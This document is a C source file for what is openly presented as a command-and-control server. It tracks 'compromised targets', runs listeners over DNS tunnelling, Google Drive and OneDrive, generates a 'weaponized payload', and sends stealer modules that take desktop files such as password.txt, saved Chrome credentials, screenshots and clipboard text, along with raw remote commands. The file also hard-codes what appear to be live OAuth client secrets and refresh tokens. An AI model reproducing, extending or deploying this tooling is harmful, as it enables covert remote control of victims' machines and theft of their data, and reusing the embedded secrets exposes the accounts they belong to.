#include "c2_core.h"

char selected_channel[20] = "NONE"; 
int dns_listener_running = 0;      
int drive_listener_running = 0;
int onedrive_listener_running = 0;     
int dns_sockfd = -1;                
char dns_command_buffer[512] = "";  

C2Agent sessions[100];         
int session_count = 0;         
int current_interact_id = -1;  
int wes_pipeline_active = 0;

const char *GLOBAL_CLIENT_ID = "823023748468-d2iodbkg657ls3k0gqag75fpmbtvscq3.apps.googleusercontent.com";
const char *GLOBAL_CLIENT_SECRET = "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";
const char *GLOBAL_REFRESH_TOKEN = "1//04Y6fOQ61JcmlCgYIARAAGAQSNwF-L9IrwWeD0Ef40LOGdJFdAeqq74Hnij8ndc4EoeMHsI7YxTDG9CE0O9s2NIxvmI3a3GHral4";
const char *GLOBAL_CMD_FILE_ID = "1WsGYjW8Q17DJfYSpJSbMl0QVcK9Ku7S2";
const char *GLOBAL_RES_FILE_ID = "1y07m8fBC4jVEevG_7_JUU_HD2j-ac5VA";

const char *ONEDRIVE_CLIENT_ID = "32eb9a65-39cd-4953-9d63-316d76e9b4c6";
const char *ONEDRIVE_CLIENT_SECRET = "4OD8Q~yICihfEOFyIRDW8R1A9U2Uqqjn2oaj1aRU";
const char *ONEDRIVE_REFRESH_TOKEN = "M.C543_BAY.0.U.MsaArtifacts.-Ck3sBcgVRDw1Hb7AKhxSqsV0*5rpg9YiDHNJ8vzbLTxvF6hfSWO199o2QLqddyeQ55pQSevOCZGkErlETgRQi1yVCmf!EKtx6rc0tWFsWEQdI3XGzCo5blpdHdx6qeHrTh3!9b94vRwELyPBRi3JeIkdewYFE4ZR*4eRnI49giyvcMmaTzmOZqtV*3LyUU7waC192cfdRA3JGuGfEOSGalta7s4678QuYAH90Kz0Sy!D6G1pmxVTItJalqfEAj2KudVQlkwGBhSKp9WiDoe8x2I!gaJ2YnQMT6PheVytpTV6F1sk2DBChBQtrBpq0Pf3y*UONg85zZkcrKV7l3fsqL2dXELvOJev3FiPAukF9q8c";

void add_or_update_session(const char *agent_name, const char *channel) {
    for (int i = 0; i < session_count; i++) {
        if (strcmp(sessions[i].name, agent_name) == 0) {
            time_t t = time(NULL); struct tm *tm_info = localtime(&t);
            strftime(sessions[i].last_seen, sizeof(sessions[i].last_seen), "%H:%M:%S", tm_info);
            return;
        }
    }
    
    sessions[session_count].id = session_count + 1;
    strncpy(sessions[session_count].name, agent_name, sizeof(sessions[session_count].name) - 1);
    strncpy(sessions[session_count].channel, channel, sizeof(sessions[session_count].channel) - 1);
    
    time_t t = time(NULL); struct tm *tm_info = localtime(&t);
    strftime(sessions[session_count].last_seen, sizeof(sessions[session_count].last_seen), "%H:%M:%S", tm_info);
    
    printf("\n" COLOR_GREEN "[+] New C2 Session %d opened! Target Name: %s (%s)" COLOR_RESET "\n", 
           sessions[session_count].id, sessions[session_count].name, channel);
    session_count++;
}

void print_sessions() {
    printf("\n" COLOR_YELLOW "[-] Compromised Targets (Active Sessions):" COLOR_RESET "\n");
    printf("  %-5s %-25s %-12s %-12s\n", "ID", "AGENT NAME", "CHANNEL", "LAST BEACON");
    printf("  --------------------------------------------------------\n");
    for (int i = 0; i < session_count; i++) {
        printf("  %-5d %-25s %-12s %-12s\n", 
               sessions[i].id, sessions[i].name, sessions[i].channel, sessions[i].last_seen);
    }
    printf("\n* Run '" COLOR_YELLOW "interact <ID>" COLOR_RESET "' to spawn interactive target shell.\n\n");
}

void print_banner() {
    printf(COLOR_CYAN "==================================================\n" COLOR_RESET);
    printf(COLOR_BLUE "      ⚡    CORE C2 FRAMEWORK CLI TERMINAL ⚡       \n" COLOR_RESET);
    printf(COLOR_CYAN "==================================================\n" COLOR_RESET);
    printf("[*] Framework core initialized. Type '" COLOR_YELLOW "help" COLOR_RESET "' to view commands.\n\n");
}

void print_help() {
    printf("\n" COLOR_YELLOW "Command Menu Options:\n" COLOR_RESET);
    if (current_interact_id == -1) {
        printf("  %-25s %s\n", "set channel <dns/drive/onedrive>", "Switch between active communication contexts");
        printf("  %-25s %s\n", "listeners", "Display the operational status of background listeners");
        printf("  %-25s %s\n", "start listener", "Spawns a background thread listener for the active channel");
        printf("  %-25s %s\n", "generate", "Compiles and packages the weaponized payload for the VM");
        printf("  %-25s %s\n", "sessions", "List all actively compromised remote agent sessions");
        printf("  %-25s %s\n", "interact <ID>", "Enter interactive reverse shell mode with a target");
    } else {
        printf(COLOR_GREEN "  Built-in Custom Discovery Commands:\n" COLOR_RESET);
        printf("    %-23s %s\n", "Get-MyUserInfo", "Collect descriptive user identity details (whoami /groups)");
        printf("    %-23s %s\n", "Get-MyNetworkConfig", "Enumerate complete interface routing parameters (Get-NetTCPConnection)");
        printf("    %-23s %s\n", "Get-MyRunningProcesses", "Capture top CPU consuming runtime processes (Get-Process)");
        printf("    %-23s %s\n", "Get-MySystemSoftware", "Query desktop baseline artifacts (Get-ChildItem Desktop)");
        
        printf(COLOR_CYAN "\n  [⚡] Info Stealer Modules:\n" COLOR_RESET);
        printf("    %-23s %s\n", "Invoke-DesktopFileStealer", "Enumerate all desktop files & extract content (Target: password.txt)");
        printf("    %-23s %s\n", "Invoke-CredStealer", "Extract saved Google Chrome credentials (Coming Soon)");
        printf("    %-23s %s\n", "Invoke-Screenshot", "Capture a live screenshot of the victim's desktop");
        printf("    %-23s %s\n", "Invoke-ClipboardStealer", "Extract current text content from the victim's clipboard");

        printf(COLOR_YELLOW "\n  Standard Operations & Plugins:\n" COLOR_RESET);
        printf("    %-23s %s\n", "<OS command / .EXE>", "Transmit raw system execution string directly to remote agent");
        printf("    %-23s %s\n", "check-vulns", "Automated Pipeline: Fetch hotfixes and analyze vulnerabilities via WES-NG");
        printf("    %-23s %s\n", "background", "Safely exit interactive shell back to core server menu");
    }
    printf("  %-25s %s\n", "exit", "Terminates background tasks and safely shuts down server\n\n");
}

void print_listeners() {
    printf("\n" COLOR_YELLOW "[-] Active C2 Infrastructure Listeners:\n" COLOR_RESET);
    printf("  %-15s %-15s %-10s\n", "CHANNEL", "TRANSPORT", "STATUS");
    printf("  ----------------------------------------------\n");
    printf("  %-15s %-15s %s\n", "Google Drive", "HTTPS API", drive_listener_running ? COLOR_GREEN "RUNNING" COLOR_RESET : COLOR_RED "STOPPED" COLOR_RESET);
    printf("  %-15s %-15s %s\n\n", "DNS Tunnel", "UDP Port 53", dns_listener_running ? COLOR_GREEN "RUNNING" COLOR_RESET : COLOR_RED "STOPPED" COLOR_RESET);
    printf("  %-15s %-15s %s\n", "OneDrive", "HTTPS Graph", onedrive_listener_running ? COLOR_GREEN "RUNNING" COLOR_RESET : COLOR_RED "STOPPED" COLOR_RESET);
}

int main() {
    char cli_input[512];
    pthread_t dns_thread;
    pthread_t drive_thread;
    pthread_t onedrive_thread;

    print_banner();

    while (1) {
        if (current_interact_id == -1) {
            printf(COLOR_BLUE "c2-server(%s) " COLOR_RESET "> ", selected_channel);
        } else {
            printf(COLOR_RED "c2-session(%s) " COLOR_RESET "> ", sessions[current_interact_id - 1].name);
        }
        
        if (!fgets(cli_input, sizeof(cli_input), stdin)) break;
        cli_input[strcspn(cli_input, "\n")] = 0;
        if (strlen(cli_input) == 0) continue;

        if (strcmp(cli_input, "help") == 0 || strcmp(cli_input, "?") == 0) {
            print_help();
        }
        else if (strcmp(cli_input, "listeners") == 0) {
            print_listeners();
        }
        else if (strcmp(cli_input, "exit") == 0) {
            printf("[*] Shutting down framework infrastructure...\n");
            dns_listener_running = 0; drive_listener_running = 0; onedrive_listener_running = 0;
            if (dns_sockfd != -1) close(dns_sockfd);
            break;
        }
        else if (current_interact_id == -1) {
            if (strcmp(cli_input, "sessions") == 0) {
                print_sessions();
            }
            else if (strncmp(cli_input, "interact ", 9) == 0) {
                int id = atoi(cli_input + 9);
                current_interact_id = id;
                if (session_count == 0) {
                    strcpy(sessions[0].name, "Mock_Agent");
                    strcpy(sessions[0].channel, selected_channel); 
                    session_count = 1;
                }
                printf(COLOR_GREEN "[+] Shell active with %s. Type 'background' to minimize.\n" COLOR_RESET, sessions[id-1].name);
            }
            else if (strcmp(cli_input, "set channel dns") == 0) {
                strcpy(selected_channel, "DNS");
                printf(COLOR_GREEN "[+] Switched to DNS Context.\n" COLOR_RESET);
            }
            else if (strcmp(cli_input, "set channel drive") == 0) {
                strcpy(selected_channel, "DRIVE");
                printf(COLOR_GREEN "[+] Switched to Google Drive Context.\n" COLOR_RESET);
            }
            else if (strcmp(cli_input, "set channel onedrive") == 0) {
                strcpy(selected_channel, "ONEDRIVE");
                printf(COLOR_GREEN "[+] Switched to OneDrive Context.\n" COLOR_RESET);
            }
            else if (strcmp(cli_input, "generate") == 0) {
                if (strcmp(selected_channel, "DRIVE") == 0) generate_drive_agent();
                else if (strcmp(selected_channel, "DNS") == 0) generate_dns_agent();
                else if (strcmp(selected_channel, "ONEDRIVE") == 0) generate_onedrive_agent();
                else printf("[-] Error: Please select an active channel context first.\n");
            }
            else if (strcmp(cli_input, "start listener") == 0) {
                if (strcmp(selected_channel, "DRIVE") == 0 && !drive_listener_running) {
                    drive_listener_running = 1;
                    pthread_create(&drive_thread, NULL, drive_listener_thread, NULL);
                    printf(COLOR_GREEN "[+] Google Drive Listener active " COLOR_RESET "\n");
                }
                else if (strcmp(selected_channel, "DNS") == 0 && !dns_listener_running) {
                    dns_listener_running = 1;
                    pthread_create(&dns_thread, NULL, dns_listener_thread, NULL);
                    printf(COLOR_GREEN "[+] DNS Listener active " COLOR_RESET "\n");
                }
                else if (strcmp(selected_channel, "ONEDRIVE") == 0 && !onedrive_listener_running) {
                    onedrive_listener_running = 1;
                    pthread_create(&onedrive_thread, NULL, onedrive_listener_thread, NULL);
                    printf(COLOR_GREEN "[+] OneDrive Listener active " COLOR_RESET "\n");
                }
            }
        }
        // ============================================================================
        // Interactive Mode
        // ============================================================================
        else {
            if (strcmp(cli_input, "background") == 0) {
                printf("[*] Minimizing session %d to background.\n", current_interact_id);
                current_interact_id = -1;
            }
            else if (strcmp(cli_input, "Invoke-Screenshot") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                wes_pipeline_active = 0;
                
                printf("[*] Deploying Live Screenshot Module to target %s...\n", target.name);
                
                if (strcmp(target.channel, "Google Drive") == 0 || strcmp(target.channel, "DRIVE") == 0) {
                    send_command_to_drive(target.name, "Invoke-Screenshot");
                    printf("[*] Task staged: Screenshot command transmitted over Google Drive Context.\n");
                } 
                else if (strcmp(target.channel, "ONEDRIVE") == 0 || strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, "Invoke-Screenshot");
                    printf("[*] Task staged: Screenshot command transmitted over OneDrive Context.\n");
                } 
                else { 
                    printf(COLOR_RED "[-] Operational Block: Screenshot exfiltration is prevented over DNS due to UDP bandwidth constraints!\n" COLOR_RESET);
                    printf(COLOR_YELLOW "[*] Architectural Rule: Please interact with a Cloud HTTPS agent (Drive/OneDrive) to fetch image binaries.\n" COLOR_RESET);
                }
            }
            else if (strcmp(cli_input, "Invoke-CredStealer") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                wes_pipeline_active = 0; 
                
                printf("[*] Launching Credential Extractor Module on target %s...\n", target.name);
                
                if (strcmp(target.channel, "Google Drive") == 0 || strcmp(target.channel, "DRIVE") == 0) {
                    send_command_to_drive(target.name, "Invoke-CredStealer");
                }  
                else if (strcmp(target.channel, "ONEDRIVE") == 0 || strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, "Invoke-CredStealer");
                }  
                else { 
                    strncpy(dns_command_buffer, "Invoke-CredStealer", sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Command 'Invoke-CredStealer' staged in DNS Queue buffer.\n" COLOR_RESET);
                }
            } else if (strcmp(cli_input, "Invoke-DesktopFileStealer") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                wes_pipeline_active = 0;
                
                printf("[*] Executing Desktop File Enumeration module on target %s...\n", target.name);
                
                if (strcmp(target.channel, "Google Drive") == 0 || strcmp(target.channel, "DRIVE") == 0) {
                    send_command_to_drive(target.name, "Invoke-DesktopFileStealer");
                } 
                else if (strcmp(target.channel, "OneDrive") == 0 || strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, "Invoke-DesktopFileStealer");
                } 
                else { 
                    strncpy(dns_command_buffer, "Invoke-DesktopFileStealer", sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Command 'Invoke-DesktopFileStealer' staged in DNS Queue buffer.\n" COLOR_RESET);
                }
            }
            else if (strcmp(cli_input, "Invoke-ClipboardStealer") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                wes_pipeline_active = 0; 
                
                printf("[*] Capturing clipboard text content on target %s...\n", target.name);
                
                if (strcmp(target.channel, "Google Drive") == 0 || strcmp(target.channel, "DRIVE") == 0) {
                    send_command_to_drive(target.name, "Invoke-ClipboardStealer");
                }  else if (strcmp(target.channel, "OneDrive") == 0 || strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, "Invoke-ClipboardStealer");
                }  else { 
                    strncpy(dns_command_buffer, "Invoke-ClipboardStealer", sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Command 'Invoke-ClipboardStealer' staged in DNS Queue buffer.\n" COLOR_RESET);
                }
            }
            else if (strcmp(cli_input, "check-vulns") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                printf("[*] Initiating Automated WES-NG Pipeline for target %s...\n", target.name);

                wes_pipeline_active = 1;
                
                if (strcmp(target.channel, "Google Drive") == 0) {
                    printf("[*] Transmitting direct 'systeminfo' tasking over Google Drive API Context...\n");
                    send_command_to_drive(target.name, "Get-MySystemSoftware");
                } else if (strcmp(target.channel, "OneDrive") == 0) {
                    printf("[*] Transmitting direct 'systeminfo' tasking over OneDrive API Context...\n");
                    send_command_to_onedrive(target.name, "Get-MySystemSoftware");
                } else {
                    printf("[*] Staging underlying Systeminfo Streamer over DNS Tunnel...\n");
                    strncpy(dns_command_buffer, "Get-MySystemSoftware", sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Pipeline activated. Waiting for agent to stream system baseline...\n" COLOR_RESET);
                }
            }
            else if (strcmp(cli_input, "Get-MyUserInfo") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                wes_pipeline_active = 0;
                if (strcmp(target.channel, "Google Drive") == 0) {
                    send_command_to_drive(target.name, cli_input);
                } else if (strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, cli_input);
                } else {
                    strncpy(dns_command_buffer, "Get-MyUserInfo", sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Command 'Get-MyUserInfo' staged in DNS Queue buffer.\n" COLOR_RESET);
                }
            }
            else if (strcmp(cli_input, "Get-MyNetworkConfig") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                wes_pipeline_active = 0;
                if (strcmp(target.channel, "Google Drive") == 0) {
                    send_command_to_drive(target.name, cli_input);
                } else if (strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, cli_input);
                } else {
                    strncpy(dns_command_buffer, "Get-MyNetworkConfig", sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Command 'Get-MyNetworkConfig' staged in DNS Queue buffer.\n" COLOR_RESET);
                }
            }
            else if (strcmp(cli_input, "Get-MyRunningProcesses") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                wes_pipeline_active = 0;
                if (strcmp(target.channel, "Google Drive") == 0) {
                    send_command_to_drive(target.name, cli_input);
                } else if (strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, cli_input);
                } else {
                    strncpy(dns_command_buffer, "Get-MyRunningProcesses", sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Command 'Get-MyRunningProcesses' staged in DNS Queue buffer.\n" COLOR_RESET);
                }
            }
            else if (strcmp(cli_input, "Get-MySystemSoftware") == 0) {
                C2Agent target = sessions[current_interact_id - 1];
                wes_pipeline_active = 0;
                if (strcmp(target.channel, "Google Drive") == 0) {
                    send_command_to_drive(target.name, cli_input);
                } else if (strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, cli_input);
                } else {
                    strncpy(dns_command_buffer, "Get-MySystemSoftware", sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Command 'Get-MySystemSoftware' staged in DNS Queue buffer.\n" COLOR_RESET);
                }
            }
            else {
                C2Agent target = sessions[current_interact_id - 1];
                printf("[*] Sending tasking to %s: %s\n", target.name, cli_input);
                
                if (strcmp(target.channel, "Google Drive") == 0) {
                    send_command_to_drive(target.name, cli_input);
                } else if (strcmp(target.channel, "OneDrive") == 0) {
                    send_command_to_onedrive(target.name, cli_input);
                } else {
                    strncpy(dns_command_buffer, cli_input, sizeof(dns_command_buffer) - 1);
                    printf(COLOR_YELLOW "[*] Tasking staged in DNS Queue buffer.\n" COLOR_RESET);
                }
            }
        }
    }
    return 0;
}
